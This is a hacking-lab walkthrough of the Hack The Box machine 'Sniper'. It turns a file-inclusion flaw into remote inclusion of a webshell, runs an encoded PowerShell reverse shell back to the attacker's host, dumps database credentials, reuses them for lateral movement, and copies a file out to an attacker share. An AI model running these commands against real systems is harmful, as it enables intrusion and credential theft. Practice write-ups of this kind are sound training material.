
### Initial access
Nmap
```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown

```
LFI scan
```
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Sniper]
└─$ ffuf -u  http://10.129.229.6/blog/?lang=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt -fs 2702

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.6/blog/?lang=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2702
________________________________________________

\/localhost\C$\Windows\system32\drivers\etc\hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1865ms]
\/127.0.0.1\C$\Windows\system32\drivers\etc\hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1871ms]
/\127.0.0.1\C$\Windows\system32\drivers\etc\hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1872ms]
/\127.0.0.1\C$\Windows\system32\drivers\etc\hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1926ms]
\/localhost/C$/Windows/system32/drivers/etc/hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1928ms]
\\localhost\C$\Windows\system32\drivers\etc\hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1928ms]
//localhost/C$/Windows/system32/drivers/etc/hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1929ms]
/\localhost/C$/Windows/system32/drivers/etc/hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 1929ms]
\/localhost\C$\Windows\system32\drivers\etc\hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2160ms]
/\localhost\C$\Windows\system32\drivers\etc\hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2166ms]
\/127.0.0.1/C$/Windows/system32/drivers/etc/hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2201ms]
\\127.0.0.1\C$\Windows\system32\drivers\etc\hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2201ms]
/\localhost/C$/Windows/system32/drivers/etc/hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2203ms]
\/localhost/C$/Windows/system32/drivers/etc/hosts. [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2203ms]
/\localhost\C$\Windows\system32\drivers\etc\hosts [Status: 200, Size: 2187, Words: 461, Lines: 85, Duration: 2337ms]

```
Create usern and read session file using phpsession
Read session file
```bash
curl 'http://10.129.229.6/blog/?lang=/\::1\C$\Windows\Temp\sess_74jgqjimvanukjmq8csa8r93bs'

</body>

</html>
username|s:4:"test";</body>
</html>



```

Using smbshare using lfi become rfi, we use `&` because we already have the `?` which intial the first para if we use `?` it will treat as the part of url for `lang` the request in url we need use to use `&` to make the cmd become second para
```bash | {2,63}
┌──(kali㉿kali)-[~/HTB/Sniper]
└─$ curl 'http://10.129.229.6/blog/?lang=/\10.10.17.47\share\webshell.php&cmd=whoami'
<html>
<body>
<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Services blog</title>
  
  
  
      <link rel="stylesheet" href="/blog/css/style.css">

  
</head>

<body>

  
<div id="main">
  <div class="container">
    <nav>
      <div class="nav-fostrap">
        <ul>
          <li><a href="/">Home</a></li>
          <li><a href="javascript:void(0)" >Language<span class="arrow-down"></span></a>
            <ul class="dropdown">
              <li><a href="/blog?lang=blog-en.php">English</a></li>
              <li><a href="/blog?lang=blog-es.php">Spanish</a></li>
              <li><a href="/blog?lang=blog-fr.php">French</a></li>
            </ul>
          </li>
          <li><a href="javascript:void(0)" >Download<span class="arrow-down"></span></a>
            <ul class="dropdown">
              <li><a href="">Tools</a></li>
              <li><a href="">Backlink</a></li>
            </ul>
          </li>
        </ul>
      </div>
      <div class="nav-bg-fostrap">
        <div class="navbar-fostrap"> <span></span> <span></span> <span></span> </div>
        <a href="" class="title-mobile">Fostrap</a>
      </div>
    </nav>
</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
<script>
  
  

    <script  src="js/index.js"></script>




</body>

</html>
<pre>nt authority\iusr
</pre>                    
```
Revshell
```powershell
┌──(kali㉿kali)-[~/HTB/Sniper]
└─$ curl 'http://10.129.229.6/blog/?lang=/\10.10.17.47\share\webshell.php&cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANAA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D'

┌──(kali㉿kali)-[~/HTB/Sniper]
└─$ rlwrap nc -lvnp 443                                                          
listening on [any] 443 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.229.6] 49752

PS C:\inetpub\wwwroot\blog> 

PS C:\inetpub\wwwroot\user> cat db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>


```

```bash
┌──(kali㉿kali)-[~/HTB/Sniper]
└─$ nxc smb 10.129.229.6 -u 'chris' -p '36mEAhz/B8xQ~2VM'                                                                             
SMB         10.129.229.6    445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False) 
SMB         10.129.229.6    445    SNIPER           [+] Sniper\chris:36mEAhz/B8xQ~2VM 
                                                                                          
```

### Lateral Movement
```powershell
PS C:\tmp> $username = ".\chris"
$password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
PS C:\tmp> PS C:\tmp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
sniper\chris

```
### Priv escalation

I use godpotato to get revshell with `nt system` and pwn the machine in  iis session

Alternative we recon chris folder after we have revshell with chris cred
```bash
PS C:\Users\Chris\Downloads> copy C:\Users\Chris\Downloads\instructions.chm \\10.10.17.47\share\
PS C:\Users\Chris\Downloads> 
PS C:\Docs> cat note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.


```

```bash
┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ 7z x instructions.chm -oinstructions.out 

7-Zip 26.02 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-06-25
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 10462 bytes (11 KiB)

Extracting archive: instructions.chm
--
Path = instructions.chm
Type = Chm
Physical Size = 10462

Everything is Ok

Folders: 2
Files: 12
Size:       11395
Compressed: 10462
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ cat instructions.out 
cat: instructions.out: Is a directory
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ cd instructions.out/    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/exploit-tool/instructions.out]
└─$ ls
'$FIftiMain'  '$OBJINST'  '$WWAssociativeLinks'  '$WWKeywordLinks'   a.html  '#IDXHDR'  '#ITBITS'  '#STRINGS'  '#SYSTEM'  '#TOPICS'  '#URLSTR'  '#URLTBL'

```

So the writeup need you to use windows tool to create mallicous .chm file, so fuck off mate this is bull shit. Just use godpotato elegant way than this shit and the the service  web  have `Seimpersionate` so this good way too solve. Rather than catch smb hash v2  that we have to crack bullshit.